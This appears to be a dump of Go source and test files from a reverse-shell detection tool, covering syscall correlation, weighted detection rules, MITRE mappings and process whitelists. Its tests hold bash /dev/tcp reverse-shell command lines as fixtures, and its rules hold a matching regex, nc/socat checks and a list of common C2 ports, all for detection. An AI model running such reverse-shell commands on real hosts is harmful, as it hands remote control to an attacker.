+		return false
+	}
+
+	if _, ok := e.userSet[state.UID]; ok {
+		return true
+	}
+
+	fullPath := strings.TrimSpace(strings.ToLower(path.Clean(state.ExePath)))
+	if fullPath != "" {
+		if _, ok := e.pathSet[fullPath]; ok {
+			return true
+		}
+		base := strings.ToLower(filepath.Base(fullPath))
+		if _, ok := e.processNameSet[base]; ok {
+			return true
+		}
+	}
+
+	if state.RemoteIP != nil {
+		ip := state.RemoteIP
+		if v4 := ip.To4(); v4 != nil {
+			ip = v4
+		}
+		if _, ok := e.ipSet[ip.String()]; ok {
+			return true
+		}
+		for _, netw := range e.ipNets {
+			if netw.Contains(ip) {
+				return true
+			}
+		}
+	}
+
+	return false
+}
+
+func buildAlertID(sessionID string, ts uint64, syscall uint32) string {
+	seed := fmt.Sprintf("%s:%d:%d", sessionID, ts, syscall)
+	hash := sha1.Sum([]byte(seed))
+	return "rsbp-" + hex.EncodeToString(hash[:8])
+}
+
+func buildCorrelationID(seed string) string {
+	hash := sha1.Sum([]byte(seed))
+	return hex.EncodeToString(hash[:8])
+}
+
+func scoreToSeverity(score float64) types.AlertSeverity {
+	switch {
+	case score >= 0.9:
+		return types.SeverityCritical
+	case score >= 0.7:
+		return types.SeverityHigh
+	case score >= 0.5:
+		return types.SeverityMedium
+	default:
+		return types.SeverityLow
+	}
+}
+
+func correlatedChain(state *correlation.SessionState) []string {
+	if state == nil {
+		return nil
+	}
+
+	out := make([]string, 0, 5)
+	if state.HasExecve {
+		out = append(out, "execve")
+	}
+	if state.HasSocket {
+		out = append(out, "socket")
+	}
+	if state.HasConnect {
+		out = append(out, "connect")
+	}
+	if state.HasDupToStdio {
+		out = append(out, "dup2")
+	}
+	if state.HasForkWithPipe {
+		out = append(out, "fork_pipe")
+	}
+	return out
+}
+
+func processComm(state *correlation.SessionState) string {
+	if state == nil {
+		return ""
+	}
+	if len(state.ProcessTree) > 0 {
+		return state.ProcessTree[len(state.ProcessTree)-1].Comm
+	}
+	if state.ExePath != "" {
+		return filepath.Base(state.ExePath)
+	}
+	if state.RemoteIP != nil && state.RemoteIP.Equal(net.IPv4zero) {
+		return "unknown"
+	}
+	return "unknown"
+}
+
+func primaryRuleID(fired []string) string {
+	if len(fired) == 0 {
+		return "RSBP-REV-SHELL-001"
+	}
+	return fired[0]
+}
+
+===== ./internal/detection/engine_test.go =====
+package detection
+
+import (
+	"net"
+	"testing"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+func TestEvaluateGeneratesAlert(t *testing.T) {
+	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.55}, zap.NewNop())
+	state := &correlation.SessionState{
+		PID:           4321,
+		PPID:          1,
+		UID:           1000,
+		GID:           1000,
+		ExePath:       "/bin/bash",
+		Cmdline:       "bash -i >& /dev/tcp/8.8.8.8/4444 0>&1",
+		HasExecve:     true,
+		HasSocket:     true,
+		HasConnect:    true,
+		HasDupToStdio: true,
+		RemoteIP:      net.ParseIP("8.8.8.8"),
+		RemotePort:    4444,
+		StartTime:     time.Now().Add(-2 * time.Second),
+		LastUpdate:    time.Now(),
+		Category:      1,
+	}
+	ev := types.SyscallEvent{SyscallNr: 42, TimestampNS: uint64(time.Now().UnixNano())}
+
+	alerts := eng.Evaluate(state, ev, "host-a")
+	if len(alerts) != 1 {
+		t.Fatalf("expected 1 alert, got %d", len(alerts))
+	}
+	if alerts[0].HostID != "host-a" {
+		t.Fatalf("unexpected host id: %s", alerts[0].HostID)
+	}
+	if alerts[0].Severity == "" {
+		t.Fatalf("severity should be populated")
+	}
+	if alerts[0].SessionID == "" || alerts[0].AlertID == "" || alerts[0].CorrelationID == "" {
+		t.Fatalf("expected alert IDs to be populated")
+	}
+}
+
+func TestEvaluateSuppressedWhenBelowMinScore(t *testing.T) {
+	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.9}, zap.NewNop())
+	state := &correlation.SessionState{
+		PID:        55,
+		ExePath:    "/bin/bash",
+		HasExecve:  true,
+		HasConnect: true,
+		RemoteIP:   net.ParseIP("8.8.8.8"),
+		RemotePort: 443,
+		StartTime:  time.Now().Add(-2 * time.Second),
+		LastUpdate: time.Now(),
+	}
+	ev := types.SyscallEvent{SyscallNr: 42, TimestampNS: uint64(time.Now().UnixNano())}
+	if got := eng.Evaluate(state, ev, "host"); len(got) != 0 {
+		t.Fatalf("expected no alerts due to min score gate")
+	}
+}
+
+func TestBehaviorScoreWindowAndBranches(t *testing.T) {
+	eng := NewEngine(Config{ExecConnectWindowSeconds: 2, MinScore: 0.1}, zap.NewNop())
+
+	late := &correlation.SessionState{
+		HasExecve:  true,
+		HasConnect: true,
+		StartTime:  time.Now().Add(-10 * time.Second),
+		LastUpdate: time.Now(),
+	}
+	if score := eng.behaviorScore(late); score != 0 {
+		t.Fatalf("expected zero score when window exceeded, got %f", score)
+	}
+
+	full := &correlation.SessionState{
+		ExePath:         "/usr/bin/python3",
+		Cmdline:         "python3 -c import socket",
+		HasExecve:       true,
+		HasSocket:       true,
+		HasConnect:      true,
+		HasDupToStdio:   true,
+		HasForkWithPipe: true,
+		Category:        2,
+		RemoteIP:        net.ParseIP("8.8.8.8"),
+		RemotePort:      9001,
+		StartTime:       time.Now().Add(-1 * time.Second),
+		LastUpdate:      time.Now(),
+	}
+	if score := eng.behaviorScore(full); score <= 0.9 {
+		t.Fatalf("expected high score for rich behavior, got %f", score)
+	}
+}
+
+func TestHelperFunctions(t *testing.T) {
+	id := buildAlertID("session-1", 123, 42)
+	if len(id) == 0 || id[:5] != "rsbp-" {
+		t.Fatalf("unexpected alert id: %s", id)
+	}
+	cid := buildCorrelationID("seed")
+	if len(cid) == 0 {
+		t.Fatalf("expected correlation id")
+	}
+
+	state := &correlation.SessionState{
+		ExePath:         "/bin/bash",
+		HasExecve:       true,
+		HasSocket:       true,
+		HasConnect:      true,
+		HasDupToStdio:   true,
+		HasForkWithPipe: true,
+		ProcessTree: []correlation.ProcessNode{
+			{Comm: "bash"},
+		},
+	}
+	chain := correlatedChain(state)
+	if len(chain) != 5 {
+		t.Fatalf("expected full chain, got %v", chain)
+	}
+	if comm := processComm(state); comm != "bash" {
+		t.Fatalf("unexpected process comm: %s", comm)
+	}
+	if comm := processComm(&correlation.SessionState{ExePath: "/usr/bin/python3"}); comm != "python3" {
+		t.Fatalf("expected basename fallback, got %s", comm)
+	}
+	if comm := processComm(&correlation.SessionState{RemoteIP: net.IPv4zero}); comm != "unknown" {
+		t.Fatalf("expected unknown comm fallback, got %s", comm)
+	}
+}
+
+===== ./internal/detection/mitre.go =====
+package detection
+
+import "sort"
+
+var ruleToMITRE = map[string][]string{
+	"HighRiskIPRule":         {"T1071"},
+	"SuspiciousCommandRule":  {"T1059"},
+	"CorrelatedBehaviorRule": {"T1104"},
+	"LowFPCombinedRule":      {"T1571"},
+	"KnownC2PortRule":        {"T1095"},
+	"EphemeralPortRule":      {"T1048"},
+	"ThreatIntelRule":        {"T1071"},
+	"UnusualTimeRule":        {"T1029"},
+}
+
+func MITREForRules(ruleIDs []string) []string {
+	if len(ruleIDs) == 0 {
+		return []string{"T1059", "T1104"}
+	}
+	set := make(map[string]struct{}, len(ruleIDs))
+	for _, id := range ruleIDs {
+		techniques := ruleToMITRE[id]
+		for _, t := range techniques {
+			if t == "" {
+				continue
+			}
+			set[t] = struct{}{}
+		}
+	}
+	if len(set) == 0 {
+		return []string{"T1059", "T1104"}
+	}
+	out := make([]string, 0, len(set))
+	for t := range set {
+		out = append(out, t)
+	}
+	sort.Strings(out)
+	return out
+}
+
+===== ./internal/detection/rules.go =====
+package detection
+
+import (
+	"strings"
+	"time"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/enrichment"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+type RuleInput struct {
+	Session     *correlation.SessionState
+	Enrichment  *enrichment.Result
+	Whitelisted bool
+	EventTime   time.Time
+}
+
+type RuleEvaluation struct {
+	FiredRules     []string
+	Suppressed     bool
+	SuppressReason string
+	Score          float64
+	Severity       types.AlertSeverity
+}
+
+type Rule interface {
+	ID() string
+	Name() string
+	Evaluate(in RuleInput) bool
+}
+
+type weightedRule struct {
+	id       string
+	name     string
+	score    float64
+	evaluate func(in RuleInput) bool
+}
+
+func (r weightedRule) ID() string { return r.id }
+
+func (r weightedRule) Name() string { return r.name }
+
+func (r weightedRule) Evaluate(in RuleInput) bool {
+	if r.evaluate == nil {
+		return false
+	}
+	return r.evaluate(in)
+}
+
+var (
+	highRiskIPRule = weightedRule{
+		id:    "HighRiskIPRule",
+		name:  "High Risk IP Reputation",
+		score: 0.30,
+		evaluate: func(in RuleInput) bool {
+			if in.Enrichment == nil {
+				return false
+			}
+			return in.Enrichment.ReputationScore >= 85 || in.Enrichment.AbuseConfidenceScore >= 80
+		},
+	}
+
+	suspiciousCommandRule = weightedRule{
+		id:    "SuspiciousCommandRule",
+		name:  "Suspicious Reverse Shell Command",
+		score: 0.25,
+		evaluate: func(in RuleInput) bool {
+			if in.Session == nil {
+				return false
+			}
+			cmd := strings.ToLower(in.Session.Cmdline)
+			exe := strings.ToLower(in.Session.ExePath)
+			return strings.Contains(cmd, "/dev/tcp/") ||
+				(strings.Contains(cmd, "python") && strings.Contains(cmd, "socket")) ||
+				strings.Contains(exe, "nc") ||
+				strings.Contains(exe, "socat")
+		},
+	}
+
+	correlatedBehaviorRule = weightedRule{
+		id:    "CorrelatedBehaviorRule",
+		name:  "Correlated Syscall Behavior",
+		score: 0.35,
+		evaluate: func(in RuleInput) bool {
+			if in.Session == nil {
+				return false
+			}
+			return in.Session.CategoryDetect() > 0 && in.Session.IsComplete()
+		},
+	}
+
+	lowFPCombinedRule = weightedRule{
+		id:    "LowFPCombinedRule",
+		name:  "Low False Positive Combined Rule",
+		score: 0.10,
+		evaluate: func(in RuleInput) bool {
+			return highRiskIPRule.Evaluate(in) && suspiciousCommandRule.Evaluate(in) && correlatedBehaviorRule.Evaluate(in)
+		},
+	}
+
+	ephemeralPortRule = weightedRule{
+		id:    "EphemeralPortRule",
+		name:  "Ephemeral Remote Port",
+		score: 0.15,
+		evaluate: func(in RuleInput) bool {
+			if in.Session == nil {
+				return false
+			}
+			return in.Session.RemotePort >= 40000
+		},
+	}
+
+	knownC2PortRule = weightedRule{
+		id:    "KnownC2PortRule",
+		name:  "Known C2 Port",
+		score: 0.25,
+		evaluate: func(in RuleInput) bool {
+			if in.Session == nil {
+				return false
+			}
+			switch in.Session.RemotePort {
+			case 4444, 4445, 1234, 31337, 6666, 9001:
+				return true
+			default:
+				return false
+			}
+		},
+	}
+
+	unusualTimeRule = weightedRule{
+		id:    "UnusualTimeRule",
+		name:  "Unusual UTC Activity Window",
+		score: 0.10,
+		evaluate: func(in RuleInput) bool {
+			t := in.EventTime
+			if t.IsZero() {
+				t = time.Now().UTC()
+			}
+			h := t.UTC().Hour()
+			return h >= 2 && h <= 5
+		},
+	}
+
+	threatIntelRule = weightedRule{
+		id:    "ThreatIntelRule",
+		name:  "Threat Intelligence Reputation",
+		score: 0.30,
+		evaluate: func(in RuleInput) bool {
+			if in.Enrichment == nil {
+				return false
+			}
+			return in.Enrichment.ReputationScore > 80
+		},
+	}
+)
+
+func DefaultRules() []Rule {
+	return []Rule{
+		highRiskIPRule,
+		suspiciousCommandRule,
+		correlatedBehaviorRule,
+		lowFPCombinedRule,
+		ephemeralPortRule,
+		knownC2PortRule,
+		unusualTimeRule,
+		threatIntelRule,
+	}
+}
+
+func ruleScore(ruleID string) float64 {
+	switch ruleID {
+	case "HighRiskIPRule":
+		return 0.30
+	case "SuspiciousCommandRule":
+		return 0.25
+	case "CorrelatedBehaviorRule":
+		return 0.35
+	case "LowFPCombinedRule":
+		return 0.10
+	case "EphemeralPortRule":
+		return 0.15
+	case "KnownC2PortRule":
+		return 0.25
+	case "UnusualTimeRule":
+		return 0.10
+	case "ThreatIntelRule":
+		return 0.30
+	default:
+		return 0
+	}
+}
+
+func EvaluateRules(in RuleInput) RuleEvaluation {
+	return EvaluateRulesWithRules(in, DefaultRules())
+}
+
+func EvaluateRulesWithRules(in RuleInput, rules []Rule) RuleEvaluation {
+	if in.Whitelisted {
+		return RuleEvaluation{
+			Suppressed:     true,
+			SuppressReason: "whitelisted",
+			Score:          0,
+			Severity:       types.SeverityLow,
+		}
+	}
+
+	fired := make([]string, 0, len(rules))
+	score := 0.0
+
+	for _, rule := range rules {
+		if rule == nil || !rule.Evaluate(in) {
+			continue
+		}
+		fired = append(fired, rule.ID())
+		score += ruleScore(rule.ID())
+	}
+
+	if score > 1 {
+		score = 1
+	}
+
+	return RuleEvaluation{
+		FiredRules: fired,
+		Score:      score,
+		Severity:   scoreToSeverity(score),
+	}
+}
+
+===== ./internal/detection/rules_test.go =====
+package detection
+
+import (
+	"net"
+	"testing"
+	"time"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/enrichment"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+func TestDefaultRulesCount(t *testing.T) {
+	rules := DefaultRules()
+	if len(rules) != 8 {
+		t.Fatalf("expected 8 rules, got %d", len(rules))
+	}
+}
+
+func TestEvaluateRulesIncludesNewRules(t *testing.T) {
+	now := time.Date(2026, 3, 19, 3, 0, 0, 0, time.UTC)
+	in := RuleInput{
+		Session: &correlation.SessionState{
+			ExePath:       "/bin/bash",
+			Cmdline:       "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
+			HasExecve:     true,
+			HasSocket:     true,
+			HasConnect:    true,
+			HasDupToStdio: true,
+			RemoteIP:      net.ParseIP("1.2.3.4"),
+			RemotePort:    4444,
+			StartTime:     now.Add(-1 * time.Second),
+			LastUpdate:    now,
+		},
+		Enrichment: &enrichment.Result{ReputationScore: 90, AbuseConfidenceScore: 90},
+		EventTime:  now,
+	}
+
+	res := EvaluateRulesWithRules(in, DefaultRules())
+	mustContain := []string{
+		"HighRiskIPRule",
+		"SuspiciousCommandRule",
+		"CorrelatedBehaviorRule",
+		"LowFPCombinedRule",
+		"KnownC2PortRule",
+		"ThreatIntelRule",
+		"UnusualTimeRule",
+	}
+	for _, id := range mustContain {
+		if !contains(res.FiredRules, id) {
+			t.Fatalf("expected fired rule %s in %v", id, res.FiredRules)
+		}
+	}
+}
+
+func TestEphemeralPortRule(t *testing.T) {
+	in := RuleInput{Session: &correlation.SessionState{RemotePort: 45000}}
+	res := EvaluateRulesWithRules(in, DefaultRules())
+	if !contains(res.FiredRules, "EphemeralPortRule") {
+		t.Fatalf("expected EphemeralPortRule to fire, got %v", res.FiredRules)
+	}
+}
+
+func TestWhitelistSuppressionTakesPriority(t *testing.T) {
+	res := EvaluateRulesWithRules(RuleInput{Whitelisted: true}, DefaultRules())
+	if !res.Suppressed {
+		t.Fatalf("expected suppression to be true")
+	}
+	if len(res.FiredRules) != 0 {
+		t.Fatalf("expected no fired rules when whitelisted")
+	}
+}
+
+func TestSeverityThresholds(t *testing.T) {
+	cases := []struct {
+		score float64
+		want  types.AlertSeverity
+	}{
+		{score: 0.95, want: types.SeverityCritical},
+		{score: 0.75, want: types.SeverityHigh},
+		{score: 0.55, want: types.SeverityMedium},
+	}
+
+	for _, tc := range cases {
+		if got := scoreToSeverity(tc.score); got != tc.want {
+			t.Fatalf("scoreToSeverity(%v)=%s want=%s", tc.score, got, tc.want)
+		}
+	}
+}
+
+func contains(list []string, needle string) bool {
+	for _, v := range list {
+		if v == needle {
+			return true
+		}
+	}
+	return false
+}
+
+===== ./internal/detection/whitelist.go =====
+package detection
+
+import (
+	"net"
+	"path/filepath"
+	"strings"
+	"sync"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+)
+
+var defaultProcessWhitelist = []string{
+	"curl",
+	"grafana",
+	"filebeat",
+	"elasticsearch",
+	"kibana",
+	"rsbpd",
+	"dockerd",
+	"docker",
+	"containerd",
+	"runc",
+	"node",
+	"systemd",
+	"systemd-resolved",
+	"systemd-timesyncd",
+	"systemd-logind",
+	"systemd-networkd",
+	"dbus-daemon",
+	"snapd",
+	"packagekitd",
+	"polkitd",
+	"agetty",
+	"cron",
+	"sshd",
+	"iptables",
+	"ip6tables",
+	"udevd",
+	"init",
+	"wsl-pro-service",
+	"wslgd",
+	"landscape-config",
+	"networkd-dispatcher",
+	"plymouth",
+	"modprobe",
+	"kmod",
+	"e2scrub_all",
+	"apt-helper",
+	"mandb",
+	"find",
+	"install",
+	"journalctl",
+	"rpcbind",
+	"nfs-common",
+	"rpc.statd",
+	"containerd-shim",
+	"docker-init",
+	"fusermount",
+	"http",
+	"https",
+}
+
+var defaultPathWhitelistContains = []string{
+	"/usr/lib/systemd",
+	"/lib/systemd",
+	"/usr/libexec",
+	"/usr/sbin/cron",
+	"/usr/bin/dbus",
+	"/snap/",
+	"/usr/lib/apt",
+	"/usr/lib/packagekit",
+	"/usr/share/unattended",
+	"/usr/sbin/agetty",
+	"/usr/bin/plymouth",
+	"/lib/ufw",
+	"/sbin/modprobe",
+	"/bin/kmod",
+	"/bin/mount",
+	"/bin/umount",
+	"/usr/bin/find",
+	"/usr/bin/install",
+	"/usr/bin/mandb",
+}
+
+var defaultIgnoredCIDRs = []string{
+	"127.0.0.0/8",
+	"::1/128",
+	"10.0.0.0/8",
+	"172.16.0.0/12",
+	"192.168.0.0/16",
+	"169.254.0.0/16",
+}
+
+var defaultSafePorts = map[uint16]struct{}{
+	53:  {},
+	123: {},
+	443: {},
+}
+
+var neverSuppressProcessNames = map[string]struct{}{
+	"bash":    {},
+	"sh":      {},
+	"python3": {},
+	"python":  {},
+	"nc":      {},
+	"netcat":  {},
+	"ncat":    {},
+	"dash":    {},
+}
+
+var (
+	defaultCIDROnce sync.Once
+	defaultCIDRNets []*net.IPNet
+)
+
+func isDefaultWhitelistedProcessName(name string) bool {
+	n := strings.ToLower(strings.TrimSpace(name))
+	if n == "" {
+		return false
+	}
+	for _, item := range defaultProcessWhitelist {
+		if n == item {
+			return true
+		}
+	}
+	return false
+}
+
+func isDefaultWhitelistedPath(exePath string) bool {
+	clean := strings.ToLower(strings.TrimSpace(exePath))
+	if clean == "" {
+		return false
+	}
+	for _, marker := range defaultPathWhitelistContains {
+		if strings.Contains(clean, marker) {
+			return true
+		}
+	}
+	return false
+}
+
+func isDefaultWhitelistedIP(ip net.IP) bool {
+	if ip == nil {
+		return false
+	}
+	defaultCIDROnce.Do(func() {
+		defaultCIDRNets = make([]*net.IPNet, 0, len(defaultIgnoredCIDRs))
+		for _, cidr := range defaultIgnoredCIDRs {
+			_, n, err := net.ParseCIDR(cidr)
+			if err == nil && n != nil {
+				defaultCIDRNets = append(defaultCIDRNets, n)
+			}
+		}
+	})
+
+	normalized := ip
+	if v4 := ip.To4(); v4 != nil {
+		normalized = v4
+	}
+	for _, n := range defaultCIDRNets {
+		if n.Contains(normalized) {
+			return true
+		}
+	}
+	return false
+}
+
+func isDefaultSafePort(port uint16) bool {
+	_, ok := defaultSafePorts[port]
+	return ok
+}
+
+func processNameFromSession(s *correlation.SessionState) string {
+	if s == nil {
+		return ""
+	}
+	if len(s.ProcessTree) > 0 {
+		name := strings.TrimSpace(s.ProcessTree[len(s.ProcessTree)-1].Comm)
+		if name != "" {
+			return name
+		}
+	}
+	if s.ExePath != "" {
+		return filepath.Base(strings.TrimSpace(s.ExePath))
+	}
+	return ""
+}
+
+func isNeverSuppressProcess(name string) bool {
+	_, ok := neverSuppressProcessNames[strings.ToLower(strings.TrimSpace(name))]
+	return ok
+}
+
+func shouldSuppressNode443Telemetry(s *correlation.SessionState) bool {
+	if s == nil {
+		return false
+	}
+	if s.RemotePort != 443 {
+		return false
+	}
+
+	comm := ""
+	if len(s.ProcessTree) > 0 {
+		comm = strings.ToLower(strings.TrimSpace(s.ProcessTree[len(s.ProcessTree)-1].Comm))
+	}
+
+	exe := strings.ToLower(filepath.Base(strings.TrimSpace(s.ExePath)))
+	cmdline := strings.ToLower(s.Cmdline)
+	if comm == "node" || exe == "node" || strings.Contains(cmdline, "node") {
+		return true
+	}
+	if comm == "code" || exe == "code" || strings.Contains(cmdline, "code") {
+		return true
+	}
+
+	if strings.Contains(comm, "node") {
+		return true
+	}
+	if strings.Contains(comm, "code") {
+		return true
+	}
+
+	for _, n := range s.ProcessTree {
+		p := strings.ToLower(strings.TrimSpace(n.Comm))
+		if p == "node" || p == "code" || strings.Contains(p, "node") || strings.Contains(p, "code") {
+			return true
+		}
+	}
+
+	return false
+}
+
+
+===== STEP 4: ALL CORRELATION GO FILES =====
+===== ./internal/correlation/engine.go =====
+package correlation
+
+import (
+	"context"
+	"fmt"
+	"net"
+	"regexp"
+	"strings"
+	"sync"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+const (
+	sysExecve  = 59
+	sysSocket  = 41
+	sysConnect = 42
+	sysDup2    = 33
+	sysDup3    = 292
+	sysFork    = 57
+	sysClone3  = 435
+	sysPipe    = 22
+	sysPipe2   = 293
+)
+
+var devTCPPattern = regexp.MustCompile(`bash.*-i.*>&.*/dev/tcp/(\d+\.\d+\.\d+\.\d+)/(\d+)`)
+
+type parentSocketState struct {
+	SocketFD   int32
+	RemoteIP   net.IP
+	RemotePort uint16
+	UpdatedAt  time.Time
+}
+
+type Engine struct {
+	sessions        sync.Map
+	emittedSessions sync.Map
+	parentSocketMap sync.Map
+	forkSeen        sync.Map
+	pipeSeen        sync.Map
+	windowDuration  time.Duration
+	ticker          *time.Ticker
+	output          chan<- *SessionState
+	logger          *zap.Logger
+}
+
+const emittedSessionTTL = 5 * time.Minute
+
+func New(window time.Duration, out chan<- *SessionState, log *zap.Logger) *Engine {
+	if window <= 0 {
+		window = 5 * time.Second
+	}
+	if log == nil {
+		log = zap.NewNop()
+	}
+
+	return &Engine{
+		windowDuration: window,
+		ticker:         time.NewTicker(30 * time.Second),
+		output:         out,
+		logger:         log,
+	}
+}
+
+func (e *Engine) Process(event types.SyscallEvent) {
+	if e == nil {
+		return
+	}
+	e.logger.Info("DEBUG CORRELATION RECEIVED",
+		zap.String("comm", "received"),
+		zap.Uint32("pid", event.PID),
+	)
+
+	e.logger.Debug("correlation received event",
+		zap.Uint32("pid", event.PID),
+		zap.Uint32("syscall_nr", event.SyscallNr),
+	)
+
+	pid := event.PID
+	now := timestampToTime(event.TimestampNS)
+
+	session := e.getOrCreateSession(event, now)
+	session.PPID = event.PPID
+	session.UID = event.UID
+	session.GID = event.GID
+	session.LastUpdate = now
+
+	e.upsertProcessNode(session, event, now)
+
+	switch event.SyscallNr {
+	case sysExecve:
+		session.HasExecve = true
+		exe := cString(event.ExecPath[:])
+		args := cString(event.Args[:])
+		if exe != "" {
+			session.ExePath = exe
+		} else {
+			session.ExePath = commToString(event.Comm)
+		}
+		if args != "" {
+			session.Cmdline = args
+		}
+
+		if inherited, ok := e.parentSocketMap.Load(session.PPID); ok {
+			p := inherited.(parentSocketState)
+			if !session.HasSocket && p.SocketFD >= 0 {
+				session.SocketFD = p.SocketFD
+				session.HasSocket = true
+			}
+			if !session.HasConnect && p.RemoteIP != nil && p.RemotePort != 0 {
+				session.RemoteIP = append(net.IP(nil), p.RemoteIP...)
+				session.RemotePort = p.RemotePort
+				session.HasConnect = true
+			}
+		}
+
+	case sysSocket:
+		session.HasSocket = true
+		session.SocketFD = event.FD
+		e.parentSocketMap.Store(pid, parentSocketState{
+			SocketFD:  event.FD,
+			UpdatedAt: now,
+		})
+
+	case sysConnect:
+		session.HasConnect = true
+		session.SocketFD = event.FD
+		ip := ipFromFields(event.Family, event.RemoteIP4, event.RemoteIP6)
+		if ip != nil {
+			session.RemoteIP = ip
+		}
+		if event.RemotePort != 0 {
+			session.RemotePort = event.RemotePort
+		}
+		e.parentSocketMap.Store(pid, parentSocketState{
+			SocketFD:   session.SocketFD,
+			RemoteIP:   append(net.IP(nil), session.RemoteIP...),
+			RemotePort: session.RemotePort,
+			UpdatedAt:  now,
+		})
+
+		if parentAny, ok := e.sessions.Load(session.PPID); ok {
+			if parent, ok := parentAny.(*SessionState); ok && parent != nil {
+				parent.HasConnect = true
+				if parent.SocketFD < 0 && session.SocketFD >= 0 {
+					parent.SocketFD = session.SocketFD
+				}
+				if session.RemoteIP != nil {
+					parent.RemoteIP = append(net.IP(nil), session.RemoteIP...)
+				}
+				if session.RemotePort != 0 {
+					parent.RemotePort = session.RemotePort
+				}
+				parent.LastUpdate = now
+				e.sessions.Store(parent.PID, parent)
+				e.parentSocketMap.Store(parent.PID, parentSocketState{
+					SocketFD:   parent.SocketFD,
+					RemoteIP:   append(net.IP(nil), parent.RemoteIP...),
+					RemotePort: parent.RemotePort,
+					UpdatedAt:  now,
+				})
+			}
+		}
+
+	case sysDup2, sysDup3:
+		if event.HasDup2Stdio != 0 {
+			session.HasDupToStdio = true
+		}
+
+	case sysFork, sysClone3:
+		e.forkSeen.Store(pid, true)
+		if _, ok := e.pipeSeen.Load(pid); ok {
+			session.HasForkWithPipe = true
+		}
+
+	case sysPipe, sysPipe2:
+		e.pipeSeen.Store(pid, true)
+		if _, ok := e.forkSeen.Load(pid); ok {
+			session.HasForkWithPipe = true
+		}
+	}
+
+	session.Category = session.CategoryDetect()
+	e.sessions.Store(pid, session)
+	e.logDebugSessionState(event, session)
+
+	complete := session.IsComplete()
+	if complete {
+		e.logger.Info("SESSION COMPLETE - emitting alert",
+			zap.Uint32("pid", session.PID),
+			zap.String("exe", session.ExePath),
+		)
+	}
+
+	e.maybeEmit(session, complete)
+}
+
+func (e *Engine) logDebugSessionState(event types.SyscallEvent, session *SessionState) {
+	if e == nil || e.logger == nil || session == nil {
+		return
+	}
+	comm := strings.ToLower(strings.TrimSpace(commToString(event.Comm)))
+	if comm == "" {
+		comm = strings.ToLower(strings.TrimSpace(session.ProcessName()))
+	}
+	if !isDebugShellTool(comm) {
+		return
+	}
+
+	remoteIP := "<nil>"
+	if session.RemoteIP != nil {
+		remoteIP = session.RemoteIP.String()
+	}
+
+	e.logger.Info("DEBUG SESSION STATE",
+		zap.String("comm", comm),
+		zap.Uint32("pid", session.PID),
+		zap.Bool("has_execve", session.HasExecve),
+		zap.Bool("has_socket", session.HasSocket),
+		zap.Bool("has_connect", session.HasConnect),
+		zap.Bool("has_dup2_stdio", session.HasDupToStdio),
+		zap.String("remote_ip", remoteIP),
+		zap.Uint16("remote_port", session.RemotePort),
+		zap.Float64("score", debugSessionScore(session)),
+	)
+}
+
+func debugSessionScore(s *SessionState) float64 {
+	if s == nil {
+		return 0
+	}
+	score := 0.0
+	if s.HasExecve {
+		score += 0.25
+	}
+	if s.HasSocket {
+		score += 0.20
+	}
+	if s.HasConnect {
+		score += 0.25
+	}
+	if s.HasDupToStdio {
+		score += 0.30
+	}
+	if score > 1 {
+		score = 1
+	}
+	return score
+}
+
+func isDebugShellTool(comm string) bool {
+	switch strings.ToLower(strings.TrimSpace(comm)) {
+	case "bash", "sh", "python3", "nc":
+		return true
+	default:
+		return false
+	}
+}
+
+func (e *Engine) maybeEmit(session *SessionState, complete bool) {
+	if e == nil || session == nil || e.output == nil {
+		return
+	}
+	e.cleanupEmitted(time.Now())
+	if session.LastUpdate.Sub(session.StartTime) > e.windowDuration {
+		return
+	}
+	if !complete {
+		return
+	}
+
+	key := emittedSessionKey(session)
+	if _, alreadyEmitted := e.emittedSessions.LoadOrStore(key, time.Now()); alreadyEmitted {
+		return
+	}
+
+	copyState := deepCopySession(session)
+	select {
+	case e.output <- copyState:
+	default:
+		e.logger.Warn("correlation output channel full, dropping session", zap.Uint32("pid", session.PID))
+	}
+}
+
+func (e *Engine) cleanup() {
+	if e == nil {
+		return
+	}
+
+	cutoff := time.Now().Add(-2 * e.windowDuration)
+	e.sessions.Range(func(key, value any) bool {
+		pid, ok := key.(uint32)
+		if !ok {
+			return true
+		}
+		session, ok := value.(*SessionState)
+		if !ok {
+			e.sessions.Delete(key)
+			return true
+		}
+
+		if session.LastUpdate.Before(cutoff) && !session.IsComplete() {
+			e.sessions.Delete(pid)
+			e.parentSocketMap.Delete(pid)
+			e.forkSeen.Delete(pid)
+			e.pipeSeen.Delete(pid)
+		}
+		return true
+	})
+	e.cleanupEmitted(time.Now())
+}
+
+func (e *Engine) cleanupEmitted(now time.Time) {
+	e.emittedSessions.Range(func(key, value any) bool {
+		ts, ok := value.(time.Time)
+		if !ok || time.Since(ts) > emittedSessionTTL {
+			e.emittedSessions.Delete(key)
+		}
+		return true
+	})
+}
+
+func emittedSessionKey(session *SessionState) string {
+	if session == nil {
+		return ""
+	}
+	remoteIP := ""
+	if session.RemoteIP != nil {
+		remoteIP = session.RemoteIP.String()
+	}
+	pattern := ""
+	if p := BestMatchPattern(session); p != nil {
+		pattern = p.Name
+	}
+	if pattern == "" {
+		pattern = fmt.Sprintf("cat-%d", session.CategoryDetect())
+	}
+	return fmt.Sprintf("%d|%s|%s", session.PID, remoteIP, pattern)
+}
+
+func (e *Engine) Run(ctx context.Context, events <-chan types.SyscallEvent) {
+	if e == nil {
+		return
+	}
+
+	cleanupDone := make(chan struct{})
+	go func() {
+		defer close(cleanupDone)
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			case <-e.ticker.C:
+				e.cleanup()
+			}
+		}
+	}()
+
+	for {
+		select {
+		case <-ctx.Done():
+			e.ticker.Stop()
+			<-cleanupDone
+			return
+		case ev, ok := <-events:
+			if !ok {
+				e.ticker.Stop()
+				<-cleanupDone
+				return
+			}
+			e.logger.Info("DEBUG CORRELATION RECEIVED",
+				zap.String("comm", "received"),
+				zap.Uint32("pid", ev.PID),
+			)
+			e.Process(ev)
+		}
+	}
+}
+
